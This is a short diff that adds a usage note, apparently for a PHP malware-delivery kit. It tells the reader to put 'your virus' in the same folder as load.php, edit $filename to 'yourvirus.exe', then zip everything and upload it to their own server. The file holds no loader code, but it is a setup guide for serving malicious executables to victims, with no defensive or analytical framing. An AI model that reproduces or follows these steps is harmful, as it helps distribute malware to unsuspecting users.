@@ -1,0 +1,7 @@
+Please just put your virus in the same path of the file named load.php
+PLEASE DO NOT MOVE THE LOAD.PHP
+
+Open load.php and edit $filename = "yourvirus.exe"
+
+
+Zip everythings And upload to your server
